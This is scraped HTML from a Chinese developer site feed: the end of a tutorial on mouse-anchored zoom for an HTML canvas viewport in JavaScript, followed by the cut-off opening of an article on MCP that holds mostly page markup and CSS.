<li>在缩放发生<strong>后</strong>，计算鼠标现在指向的世界坐标 <code>P2</code>。</li>
<li>计算偏移量 <code>delta = P2 - P1</code>，并把它加回到视口的 <code>offset</code> 里。</li>
<li><strong>一句话解释</strong>：如果画面因为缩放跑偏了，我们就把它拽回来。</li>
</ul>
</li>
<li>
<p><strong>第三步：渲染层应用</strong>。<code>translate</code> 和 <code>scale</code> 的顺序至关重要。</p>
</li>
</ul>
<hr/>
<h2 data-id="heading-3">上代码</h2>
<h3 data-id="heading-4">更改<code>Viewport</code>类</h3>
<p>去 <code>src/view/viewport.js</code> 动大手术。</p>
<p><strong>注意：</strong> 这里我们要修正一下上一篇的 <code>getMouse</code> 逻辑。标准的图形学做法是：<strong>放大 = 视野变小 = 坐标除以缩放系数</strong>。</p>
<p>JavaScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// src/view/viewport.js</span>
<span class="hljs-keyword">import</span> Point2D from <span class="hljs-string">"../primitives/point2D.js"</span>;

export default <span class="hljs-keyword">class</span> <span class="hljs-title class_">Viewport</span> {
  <span class="hljs-keyword">constructor</span>(canvas) {
    <span class="hljs-keyword">this</span>.canvas = canvas;
    <span class="hljs-keyword">this</span>.ctx = canvas.getContext(<span class="hljs-string">"2d"</span>);

    <span class="hljs-keyword">this</span>.zoom = <span class="hljs-number">1</span>; <span class="hljs-comment">// 1 = 100%, 2 = 200%</span>
    <span class="hljs-keyword">this</span>.center = new Point2D(canvas.width / <span class="hljs-number">2</span>, canvas.height / <span class="hljs-number">2</span>);
    <span class="hljs-comment">// offset 表示摄像机的平移位置</span>
    <span class="hljs-keyword">this</span>.offset = new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>);

    <span class="hljs-keyword">this</span>.drag = {
      start: new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      end: new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      offset: new Point2D(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
      active: <span class="hljs-literal">false</span>
    };

    <span class="hljs-keyword">this</span>.#addEventListeners();
  }

  <span class="hljs-comment">// 【核心数学升级】</span>
  <span class="hljs-comment">// 屏幕坐标 -&gt; 世界坐标</span>
  getMouse(evt, subtractDragOffset = <span class="hljs-literal">false</span>) {
    <span class="hljs-comment">// 1. 减去屏幕中心（把原点挪到屏幕中间）</span>
    <span class="hljs-comment">// 2. 除以缩放（反向映射：屏幕像素 / 缩放 = 世界距离）</span>
    <span class="hljs-comment">// 3. 减去摄像机偏移</span>
    <span class="hljs-keyword">const</span> p = new Point2D(
      (evt.offsetX - <span class="hljs-keyword">this</span>.center.x) / <span class="hljs-keyword">this</span>.zoom - <span class="hljs-keyword">this</span>.offset.x,
      (evt.offsetY - <span class="hljs-keyword">this</span>.center.y) / <span class="hljs-keyword">this</span>.zoom - <span class="hljs-keyword">this</span>.offset.y
    );
    <span class="hljs-keyword">return</span> p;
  }

  <span class="hljs-comment">// 获取计算后的偏移量（给 Canvas 渲染用）</span>
  getOffset() {
      <span class="hljs-keyword">return</span> new Point2D(
          <span class="hljs-keyword">this</span>.offset.x + <span class="hljs-keyword">this</span>.center.x,
          <span class="hljs-keyword">this</span>.offset.y + <span class="hljs-keyword">this</span>.center.y
      );
  }

  #addEventListeners() {
    <span class="hljs-comment">// ... (保留上一篇的空格键监听代码) ...</span>
    <span class="hljs-comment">// ... (保留上一篇的 mousedown 监听代码) ...</span>
    <span class="hljs-comment">// ... (保留上一篇的 mouseup 监听代码) ...</span>
    
    <span class="hljs-comment">// 【新增】鼠标滚轮监听</span>
    <span class="hljs-keyword">this</span>.canvas.addEventListener(<span class="hljs-string">"wheel"</span>, (evt) =&gt; <span class="hljs-keyword">this</span>.#handleWheel(evt));
    
    <span class="hljs-comment">// ... (保留 mousemove，但要注意里面 getMouse 的调用) ...</span>
    <span class="hljs-comment">// 稍微修正一下 mousemove 里的逻辑，确保它是基于最新的 zoom 计算的</span>
     <span class="hljs-keyword">this</span>.canvas.addEventListener(<span class="hljs-string">"mousemove"</span>, (evt) =&gt; {
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.drag.active) {
        <span class="hljs-keyword">this</span>.drag.end = <span class="hljs-keyword">this</span>.getMouse(evt);
        <span class="hljs-keyword">this</span>.drag.offset = new Point2D(
            <span class="hljs-keyword">this</span>.drag.end.x - <span class="hljs-keyword">this</span>.drag.start.x,
            <span class="hljs-keyword">this</span>.drag.end.y - <span class="hljs-keyword">this</span>.drag.start.y
        );
        <span class="hljs-comment">// 累加</span>
        <span class="hljs-keyword">this</span>.offset.x += <span class="hljs-keyword">this</span>.drag.offset.x;
        <span class="hljs-keyword">this</span>.offset.y += <span class="hljs-keyword">this</span>.drag.offset.y;
        
        <span class="hljs-comment">// 重置 start</span>
        <span class="hljs-keyword">this</span>.drag.start = <span class="hljs-keyword">this</span>.getMouse(evt); 
      }
    });
  }

  <span class="hljs-comment">// 【新增】处理滚轮缩放</span>
  #handleWheel(evt) {
    <span class="hljs-comment">// 1. 判断滚轮方向 (向上滚是负数-放大，向下滚是正数-缩小)</span>
    <span class="hljs-keyword">const</span> dir = Math.sign(evt.deltaY); 
    <span class="hljs-comment">// 2. 定义缩放步长 (每次滚大概变 10%)</span>
    <span class="hljs-keyword">const</span> step = <span class="hljs-number">0.1</span>;
    
    <span class="hljs-comment">// 此处应用“定点缩放”策略：</span>
    <span class="hljs-comment">// 第一步：缩放前，鼠标在世界里的哪里？</span>
    <span class="hljs-comment">// (注意：这里直接透传 evt 进去算，不需要 subtractDragOffset)</span>
    <span class="hljs-keyword">const</span> mouseBefore = <span class="hljs-keyword">this</span>.getMouse(evt);

    <span class="hljs-comment">// 第二步：执行缩放</span>
    <span class="hljs-keyword">this</span>.zoom += dir * step;
    <span class="hljs-comment">// 限制一下缩放范围，别缩没了或者放太大</span>
    <span class="hljs-keyword">this</span>.zoom = Math.max(<span class="hljs-number">1</span>, Math.min(<span class="hljs-number">5</span>, <span class="hljs-keyword">this</span>.zoom));

    <span class="hljs-comment">// 第三步：缩放后，鼠标在世界里的哪里？</span>
    <span class="hljs-keyword">const</span> mouseAfter = <span class="hljs-keyword">this</span>.getMouse(evt);

    <span class="hljs-comment">// 第四步：计算偏差，修正 offset</span>
    <span class="hljs-comment">// 既然鼠标不应该动，那如果 mouseAfter 变了，说明世界“滑”走了</span>
    <span class="hljs-comment">// 我们要把世界拽回来</span>
    <span class="hljs-keyword">this</span>.offset.x += (mouseAfter.x - mouseBefore.x);
    <span class="hljs-keyword">this</span>.offset.y += (mouseAfter.y - mouseBefore.y);
    
    <span class="hljs-comment">// 阻止浏览器默认的滚动页面行为</span>
    evt.preventDefault();
  }
}
</code></pre>
<blockquote>
<p><strong>补充说明</strong>：你可能注意到 <code>mousemove</code> 里我没怎么改。因为 <code>getMouse</code> 内部已经应用了 <code>this.zoom</code>。只要 <code>getMouse</code> 公式是对的，拖拽平移逻辑就能自动适配缩放（比如放大后，拖拽会变慢，这是符合物理直觉的，因为你视野变小了）。</p>
</blockquote>
<hr/>
<h3 data-id="heading-5">Again And Again</h3>
<p>现在数据层对了，但现在运行代码，会发现画面没有任何变化。</p>
<p>憋急，因为 Canvas 还不知道要缩放。</p>
<p>在<code>src/index.js</code>，需要调整 <code>ctx</code> 的变换顺序。</p>
<p><strong>脑子里记着：先平移到中心，再缩放，再平移回视口偏移。</strong></p>
<p>JavaScript</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// src/index.js</span>
<span class="hljs-comment">// ... imports</span>

export default <span class="hljs-keyword">class</span> <span class="hljs-title class_">World</span> {
  <span class="hljs-comment">// ... constructor 不变</span>

  animate() {
    <span class="hljs-keyword">this</span>.ctx.clearRect(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-keyword">this</span>.canvas.width, <span class="hljs-keyword">this</span>.canvas.height);

    <span class="hljs-keyword">this</span>.ctx.save();
    
    <span class="hljs-comment">// 1. 把坐标原点移到屏幕中心</span>
    <span class="hljs-comment">// 为什么要这么做？因为 scale 默认是基于 (0,0) 左上角缩放的。</span>
    <span class="hljs-comment">// 我们希望基于屏幕中心缩放，这样更符合直觉。</span>
    <span class="hljs-keyword">this</span>.ctx.translate(<span class="hljs-keyword">this</span>.canvas.width / <span class="hljs-number">2</span>, <span class="hljs-keyword">this</span>.canvas.height / <span class="hljs-number">2</span>);
    
    <span class="hljs-comment">// 2. 应用缩放</span>
    <span class="hljs-keyword">this</span>.ctx.scale(<span class="hljs-keyword">this</span>.viewport.zoom, <span class="hljs-keyword">this</span>.viewport.zoom);
    
    <span class="hljs-comment">// 3. 应用视口偏移 (Viewport Offset)</span>
    <span class="hljs-comment">// 这里的 offset 已经在 Viewport 类里处理得很好了</span>
    <span class="hljs-keyword">const</span> offset = <span class="hljs-keyword">this</span>.viewport.getOffset();
    <span class="hljs-comment">// 这里的 translate 是为了让 (0,0) 回到它该去的地方</span>
    <span class="hljs-comment">// 注意：因为上面已经把原点移到了中心，这里要减去中心吗？</span>
    <span class="hljs-comment">// 不，因为 Viewport.getOffset 已经包含了 center 的逻辑?</span>
    <span class="hljs-comment">// 让我们看一眼 Viewport.js 的 getOffset: return this.offset + this.center;</span>
    
    <span class="hljs-comment">// 等等，这里的数学有点绕。让我们用最简单的推导：</span>
    <span class="hljs-comment">// 我们希望 point.x 最终渲染在： (point.x + offset.x) * zoom + center.x</span>
    <span class="hljs-comment">// Canvas 的变换栈是反向生效的（或者说矩阵乘法）：</span>
    
    <span class="hljs-comment">// 修正后的渲染逻辑：</span>
    <span class="hljs-comment">// 我们在 Viewport.js 的 getMouse 里用的公式是： (Screen - Center) / Zoom - Offset</span>
    <span class="hljs-comment">// 逆推回 Screen： Screen = (World + Offset) * Zoom + Center</span>
    
    <span class="hljs-comment">// 所以 Canvas 代码应该是：</span>
    <span class="hljs-comment">// Translate(Center) -&gt; Scale(Zoom) -&gt; Translate(Offset)</span>
    
    <span class="hljs-comment">// 这里的 offset 只需要 viewport.offset，不需要加 center</span>
    <span class="hljs-comment">// 让我们回去微调一下 Viewport.js 的 getOffset 方法，让它只返回纯粹的 offset</span>
    
    <span class="hljs-keyword">const</span> viewportOffset = <span class="hljs-keyword">this</span>.viewport.getOffset(); 
    <span class="hljs-keyword">this</span>.ctx.translate(<span class="hljs-keyword">this</span>.viewport.offset.x, <span class="hljs-keyword">this</span>.viewport.offset.y);

    <span class="hljs-comment">// 画它！</span>
    <span class="hljs-keyword">this</span>.editor.display();
    
    <span class="hljs-keyword">this</span>.ctx.restore();

    requestAnimationFrame(() =&gt; <span class="hljs-keyword">this</span>.animate());
  }
}
</code></pre>
<p>为了配合上面 <code>World</code> 的清晰逻辑，我把 <code>src/view/viewport.js</code> 里的 <code>getOffset</code> 删掉，或者直接访问 <code>this.viewport.offset</code>。</p>
<p>为了代码整洁，在 <code>Viewport</code> 里加个 getter，只返回 <code>offset</code> 属性即可，不需要加 <code>center</code>。</p>
<p>JavaScript</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 修改 src/view/viewport.js</span>
  <span class="hljs-title function_">getOffset</span>(<span class="hljs-params"/>) {
     <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">offset</span>;
  }
</code></pre>
<hr/>
<h2 data-id="heading-6">完美</h2>
<p>现在运行代码，你会发现：</p>
<ul>
<li>对着某个点放大，那个点会稳稳地停在鼠标指尖下，周围的世界向外扩散。</li>
<li>线条会随着放大变粗（因为 <code>ctx.lineWidth</code> 也被放大了）。这其实挺好的，细节看得更清楚。如果你不希望线变粗，那就是另外一个进阶话题（逆缩放线宽）。</li>
</ul>
<hr/>
<p>现在虚拟世界已经初具规模，已经实现类的如下：</p>
<ul>
<li><strong>原子层</strong>：点、线（Point2D/Segment）。</li>
<li><strong>数据层</strong>：图结构（Graph）。</li>
<li><strong>交互层</strong>：编辑器（Editor）。</li>
<li><strong>视觉层</strong>：无限画布 + 自由缩放（Viewport）。</li>
</ul>
<p>完全可以毫不吹水的说，我们已经构建了一个类似于 AutoCAD 或 Google Maps 的基础引擎。</p>
<p>嘎嘎~</p>
<p>另，这个专栏打算放一放了，好像没啥人关注，实在没啥动力了~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[MCP 完全指南（上）：撕掉标签，看清本质]]></title>    <link>https://juejin.cn/post/7581888578507522075</link>    <guid>https://juejin.cn/post/7581888578507522075</guid>    <pubDate>2025-12-10T01:48:03.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581888578507522075" data-draft-id="7580623265791901734" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="MCP 完全指南（上）：撕掉标签，看清本质"/> <meta itemprop="keywords" content="后端,前端,AI编程"/> <meta itemprop="datePublished" content="2025-12-10T01:48:03.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="一旅人"/> <meta itemprop="url" content="https://juejin.cn/user/3485898277388519"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            MCP 完全指南（上）：撕掉标签，看清本质
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3485898277388519/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    一旅人
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-10T01:48:03.000Z" title="Wed Dec 10 2025 01:48:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-10
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读13分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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